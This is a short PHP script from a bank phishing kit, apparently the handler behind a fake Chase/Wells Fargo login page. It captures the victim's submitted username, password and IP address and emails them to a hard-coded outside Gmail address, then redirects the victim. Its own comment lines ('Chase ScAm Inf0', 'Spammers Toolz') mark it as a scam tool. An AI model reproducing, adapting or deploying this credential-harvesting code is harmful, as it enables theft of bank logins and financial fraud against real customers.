<?

$ip = getenv("REMOTE_ADDR");
$message .= "---- : || Chase ScAm Inf0 (1) || :------\n";
$message .= "Username: ".$_POST['j_username']."\n";
$message .= "Password  : ".$_POST['j_password']."\n";
$message .= "----: || tHAnks tO Spammers Toolz || :------\n";
$message .= "IP: ".$ip."\n";


$recipient = "liushade84@gmail.com";
$subject = "W3LLS ID | ".$ip."\n";

mail($recipient,$subject,$message);

header("Location:  wells.htm");
?>





